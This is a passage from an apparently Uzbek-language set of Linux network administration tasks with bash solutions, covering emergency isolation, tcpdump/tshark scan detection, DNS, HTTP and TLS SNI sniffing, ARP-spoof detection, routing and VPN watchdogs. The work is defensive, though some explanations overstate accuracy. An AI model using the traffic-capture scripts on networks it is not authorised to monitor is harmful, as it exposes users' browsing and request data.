iptables -A DOCKER-USER -i "$EXT_INTERFACE" -p tcp --dport "$PROTECTED_DOCKER_PORT" -j DROP

# 4. Qolgan oddiy Docker ulanishlariga ruxsat berish
iptables -A DOCKER-USER -j RETURN

echo "[+] DOCKER-USER himoyasi o'rnatildi! ${PROTECTED_DOCKER_PORT} port faqat ${TRUSTED_ADMIN_IP} uchun ochiq."

```
**Tushuntirish:** Docker standart ravishda PREROUTING zanjirida DNAT qilib paketlarni to'g'ridan-to'g'ri FORWARD zanjiriga yo'naltiradi, oqibatda INPUT zanjiridagi hech qanday qoida ishlamay qoladi. Rasmiy yechim - Docker tomonidan yaratilgan `DOCKER-USER` maxsus zanjiriga qoidalar qo'yishdir.

---

### Topshiriq #1130: Favqulodda Tarmoq 'Panic Button' (Zero-Second Blackhole va Izolyatsiya)
**Tavsif:** Server xakerlar tomonidan buzib kirilgani aniqlanganda, tashqaridan boshqaruv (C2) serverlari bilan aloqani uzish va ma'lumotlar sizib chiqishini to'xtatish uchun barcha tarmoqni bir zumda qora tuynukka (Blackhole) tiqish skripti.
**Talablar:** ip route add blackhole default, barcha interfeyslarni o'chirish yoki iptables orqali to'liq qulflash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Favqulodda Tizimni Tarmoqdan Izolyatsiya Qilish (Panic Button)
set -euo pipefail

echo "=========================================================="
echo " [!] DIQQAT: FAVQULODDA TARMOQ BLACKHOLE FAOLASHTIRILMOQDA!"
echo "=========================================================="

# 1. Barcha chiquvchi marshrutlarni yadro darajasida qora tuynukka yo'naltirish
ip route add blackhole default metric 1 2>/dev/null || true

# 2. Xavfsizlik devori orqali barcha kiruvchi va chiquvchi trafigini bloklash
iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP

iptables -F
iptables -X

# Faqat lokal loopback (127.0.0.1) ni qoldiramiz (lokal loglar va DB uchun)
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# 3. Barcha faol tashqi TCP soketlarni majburiy uzish (ss / tcpdrop)
ss -K dst "! 127.0.0.1" 2>/dev/null || true

echo "[+] Server barcha tashqi tarmoqlardan to'liq izolyatsiya qilindi!"
echo "[+] Mahalliy konsol orqali tekshirish tavsiya etiladi."

```
**Tushuntirish:** Linux yadrosining `ip route add blackhole` imkoniyati paketlarni hatto tarmoq drayveri yoki xavfsizlik devoriga yetib bormasdan, kernel marshrutlash jadvali (FIB) darajasida nolga aylantiradi. Bu eng yuqori darajadagi kompyuter xavfsizligi insidentlarida qo'llaniladi.

---

### Topshiriq #1131: tcpdump orqali Faqat SYN Paketlarni va Noodatiy Bayroqlarni Filtrlash
**Tavsif:** Tarmoqdagi shubhali port skanerlari (Nmap stealth scan, Xmas scan, NULL scan) va yangi ochilayotgan ulanishlarni ushlash uchun TCP bayroqlari bo'yicha qat'iy BPF filtrlari tuzing.
**Talablar:** tcpdump BPF filtri: 'tcp[tcpflags] & tcp-syn != 0', 'tcp[tcpflags] == 0' (NULL scan).
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Noodatiy TCP Bayroqlari va Skanerlarni Ushtash
set -euo pipefail

INTERFACE="${1:-any}"
CAPTURE_COUNT="${2:-20}"

echo "[*] Shubhali TCP bayroqlari monitor qilinmoqda (${INTERFACE})..."

# BPF (Berkeley Packet Filter) orqali:
# 1. TCP SYN o'rnatilgan, lekin ACK bo'lmagan paketlar (Yangi ulanish tashabbuslari)
# 2. Yoki hech qanday bayrog'i bo'lmagan NULL skanerlar
# 3. Yoki FIN, PSH, URG birga yoqilgan XMAS skanerlar
BPF_FILTER="(tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn) or (tcp[13] == 0) or (tcp[13] == 0x29)"

echo "[*] BPF Filter: ${BPF_FILTER}"

tcpdump -i "$INTERFACE" -nn -c "$CAPTURE_COUNT" \
    "$BPF_FILTER" \
    -v

```
**Tushuntirish:** TCP sarlavhasining 13-bayti bayroqlarni (FIN, SYN, RST, PSH, ACK, URG) o'z ichiga oladi. `tcp[13] == 0` ifodasi hech qanday qonuniy dastur yubormaydigan, faqat Nmap kabi skanerlar tomonidan operatsion tizimni aniqlash (OS fingerprinting) uchun ishlatiladigan NULL paketlarni 100% aniqlikda tutadi.

---

### Topshiriq #1132: tcpdump bilan DNS So'rovlarni (UDP 53) Jonli Tahlil Qilish va PCAP Yozish
**Tavsif:** Kompaniya tarmog'idagi barcha kompyuterlar qaysi veb-saytlar va domenlarga so'rov yuborayotganini real vaqtda ekranda ko'rsatuvchi va pcap faylga saqlovchi tarmoq tahlilchisini yarating.
**Talablar:** tcpdump port 53, -s 0, -w capture.pcap, ASCII dekodlash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - DNS Trafigi Jonli Inspektori va PCAP Logger
set -euo pipefail

IFACE="${1:-any}"
OUTPUT_PCAP="/tmp/dns_traffic_$(date +%Y%m%d_%H%M%S).pcap"

echo "=========================================================="
echo "[*] DNS (Port 53) monitoring boshlandi..."
echo "[*] PCAP jurnali saqlanmoqda: ${OUTPUT_PCAP}"
echo "[*] To'xtatish uchun Ctrl+C bosing."
echo "=========================================================="

# -l: Chiqishni buferlamay qatorma-qator chiqarish
# -s 0: Paketni to'liq hajmda (kesmasdan) olish
# -nn: IP va portlarni nomlarga o'girmasdan raqamda qoldirish
tcpdump -i "$IFACE" -nn -l -s 0 "udp port 53" \
    -w "$OUTPUT_PCAP" &
DUMP_PID=$!

trap 'kill "$DUMP_PID" 2>/dev/null || true; echo -e "\n[+] DNS monitoring toxtatildi."; exit 0' INT TERM

# Ekranga real vaqtda so'ralayotgan domenlarni chiqaramiz
tcpdump -i "$IFACE" -nn -l "udp port 53" | while read -r line; do
    if echo "$line" | grep -q " A? "; then
        DOMAIN=$(echo "$line" | awk -F' A\? ' '{print $2}' | awk '{print $1}')
        SRC_IP=$(echo "$line" | awk '{print $3}')
        echo "[DNS QIDIRUV] IP: ${SRC_IP} so'radi -> ${DOMAIN}"
    fi
done

```
**Tushuntirish:** Deyarli barcha zararli dasturlar (malware) o'z boshqaruv serverlari bilan bog'lanishdan oldin DNS so'rovi yuboradi. Port 53 dagi UDP trafigini tahlil qilish botnet faolligi va xavfli domenlarni bir necha soniyada aniqlashning eng tezkor usulidir.

---

### Topshiriq #1133: tcpdump yordamida HTTP GET/POST Sarlavhalarini Real Vaqtda O'qish
**Tavsif:** Shifrlanmagan ichki mikroxizmatlar yoki veb serverlarda mijoz yuborgan HTTP sarlavhalari, User-Agent va so'rov parametrlarini to'g'ridan-to'g'ri terminalda inson o'qiy oladigan ASCII formatda ko'rsatish.
**Talablar:** tcpdump -A, port 80 yoki 8080, egrep orqali HTTP metodlarni filtrlash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - HTTP So'rovlar ASCII Sniffer
set -euo pipefail

IFACE="${1:-any}"
TARGET_PORT="${2:-80}"

echo "[*] HTTP (Port ${TARGET_PORT}) oqimi tahlil qilinmoqda..."

# -A: Paketlarni sof ASCII matn sifatida ko'rsatish
# -s 0: Paketlarni to'liq olish
tcpdump -i "$IFACE" -nn -A -s 0 "tcp port ${TARGET_PORT} and (((ip[2:2] - ((ip[0]&0xf)<<2)) - ((tcp[12]&0xf0)>>2)) != 0)" | \
    grep -E -i --line-buffered "^(GET |POST |PUT |DELETE |HEAD |HTTP/|Host:|User-Agent:|Content-Type:)"

```
**Tushuntirish:** Ushbu murakkab BPF filtri `((ip[2:2]...))` TCP paketining foydali yuklamasi (Payload) bor yoki yo'qligini tekshiradi. Foydali ma'lumoti yo'q bo'sh TCP ACK paketlar tashlab yuborilib, faqat haqiqiy HTTP ma'lumotlari ASCII formatda ekranga uzatiladi.

---

### Topshiriq #1134: tcpdump Aylanma (Circular Buffer) Rejimida 24/7 Doimiy Logging
**Tavsif:** Disk to'lib qolib serverni to'xtatib qo'ymasligi uchun, har biri 100 MB dan iborat maksimal 10 ta faylda aylanuvchi (Rolling PCAP Buffer) uzluksiz tarmoq jurnali tizimini joriy qiling.
**Talablar:** tcpdump -C (fayl hajmi MB), -W (fayllar soni), -w fayl_nomi, fonda ishlash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - 24/7 Rolling Circular Tarmoq Jurnali
set -euo pipefail

LOG_DIR="/var/log/network_pcaps"
IFACE="${1:-eth0}"
FILE_SIZE_MB=100
MAX_FILES=10

mkdir -p "$LOG_DIR"
echo "[*] Tarmoq aylanma jurnallash xizmati ishga tushirilmoqda..."
echo "[*] Fayllar hajmi: ${FILE_SIZE_MB} MB x ${MAX_FILES} ta fayl (Maksimal: 1 GB)"
echo "[*] Saqlash joyi:  ${LOG_DIR}"

# -C 100: Fayl 100 MB ga yetganda yangi fayl ochadi
# -W 10:  Ko'pi bilan 10 ta fayl (0 dan 9 gacha) yaratadi, keyin eng eskisini ustiga yozadi
# -K:     Cheksum xatoliklarini tekshirmasdan CPU ni tejash
exec tcpdump -i "$IFACE" -nn -s 0 -K \
    -C "$FILE_SIZE_MB" -W "$MAX_FILES" \
    -w "${LOG_DIR}/traffic_${IFACE}.pcap"

```
**Tushuntirish:** Aylanma bufer (Circular Buffer) - ishlab chiqarish serverlarida tarmoq anomaliyalarini o'rganish (Post-Mortem tahlil) uchun yagona xavfsiz usuldir. Disk hech qachon 1 GB dan oshmaydi va doim eng so'nggi vaqtdagi voqealar saqlanib turadi.

---

### Topshiriq #1135: tshark yordamida PCAP Fayldan Eng Ko'p Trafik Yeyayotgan IP-lar Top-10 Tahlili
**Tavsif:** Wireshark konsol varianti `tshark` yordamida yozib olingan katta tarmoq dumpidan eng ko'p bayt uzatgan va qabul qilgan IP manzillar reytingini tuzing.
**Talablar:** tshark -r, -T fields -e ip.src -e ip.dst, sort va uniq -c, tshark -q -z conv,ip.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - tshark PCAP Trafik va Bandwidth Tahlili
set -euo pipefail

PCAP_FILE="${1:-}"

if [[ -z "$PCAP_FILE" || ! -f "$PCAP_FILE" ]]; then
    echo "Foydalanish: $0 <pcap_fayl_yoli>"
    exit 1
fi

echo "=========================================================="
echo "[*] PCAP Tahlili: ${PCAP_FILE}"
echo "=========================================================="

echo "--- 1. Eng faol IP suhbatlari (Conversations Top-10) ---"
# -q: Jim rejim, -z conv,ip: IP ulanishlar bo'yicha baytlar hisobi
tshark -r "$PCAP_FILE" -q -z conv,ip | head -n 25

echo -e "\n--- 2. Eng ko'p so'rov yuborgan manba IP-lar (Top 5) ---"
tshark -r "$PCAP_FILE" -T fields -e ip.src 2>/dev/null | \
    grep -v '^$' | sort | uniq -c | sort -nr | head -n 5

```
**Tushuntirish:** `tshark -z` statistik modullari C darajasida tahlil olib boradi. Bu orqali gigabaytlab PCAP fayllarni grafik Wireshark da ochmasdan, terminalda bir necha soniyada DDoS hujumchilari yoki tarmoqni to'ldirib yuborgan ichki serverlarni aniqlash mumkin.

---

### Topshiriq #1136: tcpdump orqali TCP Reset (RST) va Retransmission Muammolarini Aniqlash
**Tavsif:** Tarmoqdagi beqarorlik, paketlar yo'qolishi yoki mijozlarning ulanishlari nima sababdan uzilib ketayotganini tushunish uchun TCP RST bayroqlari va qayta uzatishlarni (Retransmission) tutuvchi monitor quring.
**Talablar:** BPF 'tcp[tcpflags] & tcp-rst != 0', tshark 'tcp.analysis.retransmission'.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - TCP RST va Qayta Uzatish (Retransmission) Tahlilchisi
set -euo pipefail

IFACE="${1:-any}"

echo "=========================================================="
echo "[*] Tarmoq nosozliklari monitoringi (${IFACE})..."
echo "[*] TCP RST (Majburiy uzilishlar) filtrlash..."
echo "=========================================================="

# TCP RST (Reset) bayrog'i o'rnatilgan paketlarni ushlash
tcpdump -i "$IFACE" -nn "tcp[tcpflags] & tcp-rst != 0" -l | while read -r line; do
    echo "[!] [TCP RST ANIQLANDI]: $line"
done

```
**Tushuntirish:** TCP RST paketi soket kutilmaganda yopilganda, port ochiq bo'lmaganda yoki xavfsizlik devori ulanishni majburiy o'ldirganda yuboriladi. Doimiy RST lar sonining ko'payishi tarmoq marshrutlashidagi nosozlik yoki serverdagi xotira tugaganidan dalolat beradi.

---

### Topshiriq #1137: tshark orqali TLS Handshake Server Name Indication (SNI) larni Filtrlash
**Tavsif:** HTTPS trafigi shifrlangan bo'lsa ham, dastlabki Client Hello bosqichidagi ochiq matnli Server Name Indication (SNI) nomlarini ajratib oluvchi tarmoq audit skriptini yozing.
**Talablar:** tshark -Y 'tls.handshake.type == 1', -T fields -e tls.handshake.extensions_server_name.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - TLS Client Hello SNI Auditor
set -euo pipefail

IFACE="${1:-any}"

echo "=========================================================="
echo "[*] Jonli TLS SNI audit boshlandi (${IFACE})..."
echo "=========================================================="

# tls.handshake.type == 1 bu Client Hello paketi
tshark -i "$IFACE" -l -n \
    -Y "tls.handshake.type == 1 and tls.handshake.extensions_server_name" \
    -T fields \
    -e ip.src \
    -e ip.dst \
    -e tls.handshake.extensions_server_name | while read -r src dst sni; do
        echo "[TLS Aloqa] Mijoz: ${src} -> Server: ${dst} | Domen (SNI): ${sni}"
done

```
**Tushuntirish:** Garchi butun sessiya TLS 1.3 bilan shifrlansa ham, mijoz qaysi domen bilan gaplashmoqchi ekanligini serverga bilishi uchun birinchi `Client Hello` paketida domen nomini ochiq uzatishga majbur. Bu usul xavfsizlik monitoringi (DLP) uchun juda qimmatli ma'lumot beradi.

---

### Topshiriq #1138: Tarmoq Kartasidagi Paket Yo'qolishini ethtool va dropwatch bilan Tahlil Qilish
**Tavsif:** Tarmoq trafigi yuqori bo'lganda paketlar qayerda (tarmoq kartasi RX/TX navbatida, Linux socket buferida yoki CPU yumshoq uzilishlarida) yo'qolayotganini (packet drop) aniqlovchi diagnostika vositasini tuzing.
**Talablar:** ethtool -S interfeys, rx_dropped / tx_dropped tahlili, netstat -s.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Tarmoq Paket Yo'qotishlari Diagnostikasi
set -euo pipefail

NIC="${1:-eth0}"

echo "=========================================================="
echo "[*] Tarmoq Kartasi Diagnostikasi: ${NIC}"
echo "=========================================================="

# 1. Hardware va Ring Buffer statistikalari
echo "--- 1. ethtool apparat xatoliklari ---"
ethtool -S "$NIC" 2>/dev/null | grep -iE "(drop|discard|error|miss)" | head -n 15 || echo "ethtool statistikasi olinmadi"

# 2. Ring buffer o'lchamlari
echo -e "\n--- 2. RX/TX Ring Buffer o'lchamlari ---"
ethtool -g "$NIC" 2>/dev/null || echo "Ring buffer o'lchami ko'rsatilmadi"

# 3. Linux Kernel qatlamidagi yo'qotishlar
echo -e "\n--- 3. Kernel IP/TCP Paket yo'qotishlari (/proc/net/snmp) ---"
netstat -s | grep -iE "(dropped|overflow|pruned|collapsed)" | head -n 10

```
**Tushuntirish:** Agar `rx_dropped` yoki `rx_fifo_errors` ko'p bo'lsa, tarmoq drayveri (NIC) xotirasi kichiklik qilmoqda va `ethtool -G rx 4096` orqali ring buferni kattalashtirish kerak. Agar `TCPBufferOverflow` bo'lsa, Linux `net.ipv4.tcp_rmem` parametrlarini kengaytirish lozim.

---

### Topshiriq #1139: MTU Muammolarini va Path MTU Discovery (PMTUD) Nosozliklarini Aniqlash
**Tavsif:** VPN (GRE, IPSec, WireGuard) tunnellarida MTU 1500 dan kamayishi oqibatida katta veb-saytlar ochilmay qotib qolishini aniqlash uchun ICMP 'Fragmentation Needed' xabarlarini tahlil qiling.
**Talablar:** ping -M do -s paket_hajmi, binar qidiruv orqali maksimal MTU ni topish.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Optimal Path MTU (PMTU) Aniqlash Skripti
set -euo pipefail

TARGET="${1:-google.com}"

echo "[*] ${TARGET} yo'nalishidagi Optimal MTU aniqlanmoqda..."

# ICMP sarlavhasi = 8 bayt, IP sarlavhasi = 20 bayt (Jami 28 bayt sarlavha)
# -M do: Don't Fragment (DF) bayrog'ini yoqish
low=1200
high=1500
optimal_mtu=1200

while [[ $low -le $high ]]; do
    mid=$(( (low + high) / 2 ))
    payload=$(( mid - 28 ))

    # ping yuboramiz
    if ping -c 1 -M do -s "$payload" -W 1 "$TARGET" >/dev/null 2>&1; then
        optimal_mtu=$mid
        low=$(( mid + 1 )) # Kattaroq MTU ni sinaymiz
    else
        high=$(( mid - 1 )) # Kichikroq MTU ni sinaymiz
    fi
done

echo "=========================================================="
echo "[+] Maksimal ruxsat etilgan MTU: ${optimal_mtu} bayt"
if [[ $optimal_mtu -lt 1500 ]]; then
    echo "[!] Diqqat: Tarmoqda MTU 1500 dan kam! Tarmoq kartasida MTU sozlang:"
    echo "    ip link set dev eth0 mtu ${optimal_mtu}"
else
    echo "[+] Standart Ethernet MTU (1500) to'liq ishlamoqda."
fi
echo "=========================================================="

```
**Tushuntirish:** Agar oraliq routerlar ICMP Type 3 Code 4 (Fragmentation Needed) xabarlarini xavfsizlik vajidan bloklab qo'ysa, 'PMTU Black Hole' yuzaga keladi: kichik ping o'tadi, lekin katta HTTP sahifalar yuklanmasdan abadiy qotib qoladi.

---

### Topshiriq #1140: tcpdump orqali Shubhali ARP Spoofing va Poisoning Hujumlarini Tutish
**Tavsif:** Lokal tarmoqdagi (LAN) 'Man-in-the-Middle' hujumlarini fosh qilish uchun bitta IP manzilga bir nechta har xil MAC manzillari javob berishini kuzatuvchi ARP monitor skriptini quring.
**Talablar:** tcpdump -e -n arp, MAC va IP assotsiatsiyasini saqlash, o'zgarish bo'lganda favqulodda signal.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - ARP Poisoning / Spoofing Anomaliyasi Detektori
set -euo pipefail

IFACE="${1:-eth0}"
declare -A ARP_CACHE

echo "=========================================================="
echo "[*] ARP Spoofing Monitoringi boshlandi (${IFACE})..."
echo "=========================================================="

tcpdump -i "$IFACE" -e -n -l "arp" | while read -r line; do
    # Reply paketlarini qidiramiz
    if echo "$line" | grep -q "Reply"; then
        # Namuna: ... Reply 192.168.1.1 is-at 00:11:22:33:44:55 ...
        IP=$(echo "$line" | awk '{for(i=1;i<=NF;i++) if($i=="Reply") print $(i+1)}')
        MAC=$(echo "$line" | awk '{for(i=1;i<=NF;i++) if($i=="is-at") print $(i+1)}' | tr -d ',')

        if [[ -n "$IP" && -n "$MAC" ]]; then
            if [[ -v "ARP_CACHE[$IP]" ]]; then
                OLD_MAC="${ARP_CACHE[$IP]}"
                if [[ "$OLD_MAC" != "$MAC" ]]; then
                    echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
                    echo "[FAVQULODDA XAVF] ARP SPOOFING HUJUMI ANIQLANDI!"
                    echo "IP: ${IP} ning MAC manzili o'zgartirildi!"
                    echo "Eski haqiqiy MAC: ${OLD_MAC}"
                    echo "Yangi soxta MAC:  ${MAC}"
                    echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
                fi
            else
                ARP_CACHE["$IP"]="$MAC"
                echo "[ARP Kesh] Yangi IP bog'landi: ${IP} -> ${MAC}"
            fi
        fi
    fi
done

```
**Tushuntirish:** ARP protokoli autentifikatsiyaga ega emas. Hujumchi kompyuter tarmoqqa doimiy ravishda 'Men routermanning MAC manzili' deb soxta ARP Reply paketlari tarqatish orqali barcha trafikni o'zidan o'tkaza oladi. Ushbu skript bu xesh buzilishini bir zumda aniqlaydi.

---

### Topshiriq #1141: iproute2 yordamida Siyosatga Asoslangan Marshrutlash (Policy-Based Routing - PBR)
**Tavsif:** Serverda ikkita internet provayder (ISP1 va ISP2) mavjud bo'lganda, ma'lumotlar bazasi trafigini birinchi provayderdan, oddiy veb-trafikni esa ikkinchi provayderdan o'tkazuvchi dinamik marshrutlash joriy qiling.
**Talablar:** /etc/iproute2/rt_tables, ip rule add fwmark / from, ip route add table sozlamalari.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Policy-Based Routing (PBR) Ko'p Provayderli Boshqaruv
set -euo pipefail

echo "[*] Policy-Based Routing qoidalari qo'llanilmoqda..."

# 1. Marshrutlash jadvallarini ro'yxatga olamiz (agar mavjud bo'lmasa)
if ! grep -q "200\s*isp2_table" /etc/iproute2/rt_tables 2>/dev/null; then
    echo "200 isp2_table" >> /etc/iproute2/rt_tables
fi

ISP2_GW="198.51.100.1"
ISP2_IF="eth1"
SOURCE_SUBNET="192.168.20.0/24" # Maxsus ichki subnet

# 2. isp2_table jadvaliga standart shlyuz kiritamiz
ip route flush table isp2_table || true
ip route add default via "$ISP2_GW" dev "$ISP2_IF" table isp2_table

# 3. Siyosat qoidasi (Rule): Agar paket shu subnetdan kelsa, isp2_table bo'yicha yo'naltirilsin
ip rule del from "$SOURCE_SUBNET" table isp2_table 2>/dev/null || true
ip rule add from "$SOURCE_SUBNET" table isp2_table priority 1000

# 4. Marshrut keshini yangilash
ip route flush cache

echo "[+] PBR sozlandi! ${SOURCE_SUBNET} trafigi ISP2 (${ISP2_GW}) orqali chiqmoqda."

```
**Tushuntirish:** Standart Linux marshrutlash faqat maqsad manziliga (Destination IP) qaraydi. PBR (Policy Based Routing) esa paketning manbasiga (Source IP), TOS maydoniga yoki iptables tomonidan qo'yilgan fwmark belgilariga qarab turli tarmoq yo'laklariga yo'naltirish imkonini beradi.

---

### Topshiriq #1142: Tarmoq Kartalari Birlashmasi (LACP Bonding/Teaming) Salomatligini Tekshirish
**Tavsif:** Serverdagi bir nechta fizik tarmoq interfeyslari (eth0, eth1) 802.3ad LACP orqali yagona `bond0` 20Gbps kanalga birlashtirilgan holatda, ularning holatini tekshirib, kabel uzilganda signal beruvchi watchdog skript yozing.
**Talablar:** /proc/net/bonding/bond0 tahlili, MII Status, Aggregator ID, Slave holatlari.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - LACP 802.3ad Bonding Avtomatlashtirilgan Monitoring
set -euo pipefail

BOND_INTERFACE="${1:-bond0}"
PROC_FILE="/proc/net/bonding/${BOND_INTERFACE}"

if [[ ! -f "$PROC_FILE" ]]; then
    echo "[!] $BOND_INTERFACE interfeysi bonding rejimida emas yoki mavjud emas!"
    exit 1
fi

echo "=========================================================="
echo "[*] LACP Bonding Monitoring: ${BOND_INTERFACE}"
echo "=========================================================="

BOND_MODE=$(grep -i "Bonding Mode:" "$PROC_FILE" | cut -d: -f2- | xargs)
echo "[+] Bonding Rejimi: ${BOND_MODE}"

# Barcha qul (slave) interfeyslarni tekshiramiz
FAILED_SLAVES=()
CURRENT_SLAVE=""

while read -r line; do
    if [[ "$line" =~ ^Slave\ Interface:\ (.*) ]]; then
        CURRENT_SLAVE="${BASH_REMATCH[1]}"
    elif [[ "$line" =~ ^MII\ Status:\ (.*) ]]; then
        STATUS="${BASH_REMATCH[1]}"
        if [[ "$STATUS" != "up" ]]; then
            FAILED_SLAVES+=("${CURRENT_SLAVE} (Holat: ${STATUS})")
        fi
    fi
done < "$PROC_FILE"

if [[ ${#FAILED_SLAVES[@]} -gt 0 ]]; then
    echo "[XAVF!] Quyidagi jismoniy kabellar uzilgan yoki nosoz:"
    printf " -> %s\n" "${FAILED_SLAVES[@]}"
    exit 2
else
    echo "[+] Barcha qul interfeyslar (Slaves) faol va LACP kanali barqaror!"
fi

```
**Tushuntirish:** 802.3ad LACP agregatsiyasi tarmoq o'tkazuvchanligini oshirish va ortiqchalik (redundancy) uchun ishlatiladi. Agar bitta kabel uzilsa, foydalanuvchilar buni sezmaydi; lekin ushbu monitoring tizim ma'murini zaxira yo'qolganidan zudlik bilan ogohlantiradi.

---

### Topshiriq #1143: WireGuard VPN Tunnelini Avtomatik Nazorat Qiluvchi Watchdog Skript
**Tavsif:** Filiallar o'rtasida o'rnatilgan WireGuard VPN aloqasi uzilib qolsa (Handshake 3 daqiqadan oshib ketsa), tunnelni avtomatik qayta yuklovchi (re-handshake) va xizmatni tiklovchi demon yozing.
**Talablar:** wg show all dump, Latest Handshake vaqtini tekshirish, systemctl restart wg-quick.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - WireGuard VPN Ulanish Qo'riqchisi (Watchdog)
set -euo pipefail

WG_IFACE="${1:-wg0}"
MAX_SILENCE_SEC=180 # 3 daqiqadan ko'p sukut saqlansa ulanish o'lik deb hisoblanadi

echo "[*] WireGuard (${WG_IFACE}) tekshirilmoqda..."

NOW=$(date +%s)
# wg show <iface> dump: peer, preshared_key, endpoint, allowed_ips, latest_handshake, ...
PEER_LINES=$(wg show "$WG_IFACE" dump 2>/dev/null | tail -n +2 || true)

if [[ -z "$PEER_LINES" ]]; then
    echo "[!] WireGuard interfeysi ishlamayapti yoki peerlar mavjud emas!"
    systemctl restart "wg-quick@${WG_IFACE}"
    exit 0
fi

echo "$PEER_LINES" | while read -r peer psk endpoint allowed_ips latest_handshake rx tx keepalive; do
    if [[ "$latest_handshake" -eq 0 ]]; then
        echo "[!] Peer ${peer:0:8}... bilan hech qachon handshake bo'lmagan!"
        NEED_RESTART=1
    else
        DIFF=$(( NOW - latest_handshake ))
        if [[ $DIFF -gt $MAX_SILENCE_SEC ]]; then
            echo "[!] Peer ${peer:0:8}... ${DIFF} soniya oldin yo'qolgan (Limit: ${MAX_SILENCE_SEC}s)!"
            echo "[*] Tunnel qayta ishga tushirilmoqda..."
            systemctl restart "wg-quick@${WG_IFACE}"
            break
        else
            echo "[+] Peer ${peer:0:8}... aloqada. Oxirgi Handshake: ${DIFF} soniya oldin."
        fi
    fi
done

```
**Tushuntirish:** WireGuard shivirlovchi (Silent) protokol bo'lib, agar ma'lumot bo'lmasa hech qanday paket yubormaydi. Agar NAT o'zgarib qolsa, tunnel qayta tiklanmasligi mumkin. Ushbu watchdog handshake yoshini tahlil qilib, aloqa yo'qolganda yangi kalit almashinuvini majburlaydi.

---

### Topshiriq #1144: BGP va OSPF Dinamik Marshrutlash Holatini FRRouting (vtysh) orqali Audit Qilish
**Tavsif:** Internet provayderlar va yirik ma'lumot markazlarida ishlovchi Linux FRRouting routerida BGP qo'shnilari (Peers) holatini audit qilish va Prefix qabul qilinishini tekshirish.
**Talablar:** vtysh -c 'show bgp summary', Established holati tekshiruvi, xatoliklarni qayd etish.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - FRRouting BGP Marshrutlash Auditori
set -euo pipefail

echo "=========================================================="
echo "[*] FRRouting BGP Sessiyalari Auditi..."
echo "=========================================================="

if ! command -v vtysh >/dev/null 2>&1; then
    echo "[!] FRRouting (vtysh) o'rnatilmagan! Simulyatsiya rejimida ishlaydi."
    exit 0
fi

BGP_OUTPUT=$(vtysh -c "show ip bgp summary" 2>/dev/null || true)
echo "$BGP_OUTPUT"

# BGP da holat 'Established' bo'lsa yoki qabul qilingan prefikslar soni (raqam) tursa sog'lom hisoblanadi.
# Agar 'Active', 'Idle' yoki 'Connect' tursa - sessiya uzilgan!
DOWN_PEERS=$(echo "$BGP_OUTPUT" | grep -E "([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)" | awk '$NF ~ /(Active|Idle|Connect)/ {print $1, "Holat:", $NF}')

if [[ -n "$DOWN_PEERS" ]]; then
    echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    echo "[OGOHLANTIRISH] BGP Qo'shnilari bilan aloqa uzilgan:"
    echo "$DOWN_PEERS"
    echo "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
    exit 2
else
    echo "[+] Barcha BGP qo'shnilari bilan aloqa barqaror (Established)!"
fi

```
**Tushuntirish:** FRR (FRRouting) zamonaviy Linux serverlariga korporativ Cisco yoki Juniper routerlari vazifasini beradi. BGP protokolida qo'shnilar 'Active' yoki 'Idle' holatida tursa, demak TCP 179 portiga ulanib bo'lmayapti va butun avtonom tizim (AS) trafigi uzilishi mumkin.

---

### Topshiriq #1145: Prometheus Node Exporter uchun Tarmoq Metrikalarini Yig'ish (Textfile Collector)
**Tavsif:** Standart ko'rsatkichlardan tashqari, Linux tizimidagi ochiq soketlar soni, TCP TimeWait holatlari va xatoliklarni Prometheus formatida `.prom` faylga yozib boruvchi metrika generatori yozing.
**Talablar:** ss -s tahlili, Prometheus OpenMetrics formati (HELP, TYPE, gauge), atomik mv orqali fayl yangilash.
**Yechim (Bash):**
```bash
#!/usr/bin/env bash
# Khorazmiy AI - Prometheus Node Exporter Tarmoq Metriklari Generator
set -euo pipefail

METRIC_DIR="/var/lib/node_exporter/textfile_collector"
TEMP_FILE="${METRIC_DIR}/custom_network.tmp"
FINAL_FILE="${METRIC_DIR}/custom_network.prom"

mkdir -p "$METRIC_DIR"

# 1. ss orqali soketlar statistikasini yig'amiz
TCP_ESTAB=$(ss -tan state established | tail -n +2 | wc -l)
TCP_TIMEWAIT=$(ss -tan state time-wait | tail -n +2 | wc -l)
TCP_LISTEN=$(ss -tan state listening | tail -n +2 | wc -l)

# 2. /proc/net/dev dan interfeyslar baytlari
RX_ETH0=$(grep -w "eth0" /proc/net/dev 2>/dev/null | awk '{print $2}' || echo "0")
TX_ETH0=$(grep -w "eth0" /proc/net/dev 2>/dev/null | awk '{print $10}' || echo "0")

# 3. Prometheus formatida yozamiz
cat <<EOF > "$TEMP_FILE"
# HELP node_network_tcp_established_total Barcha o'rnatilgan aktiv TCP ulanishlar soni
# TYPE node_network_tcp_established_total gauge
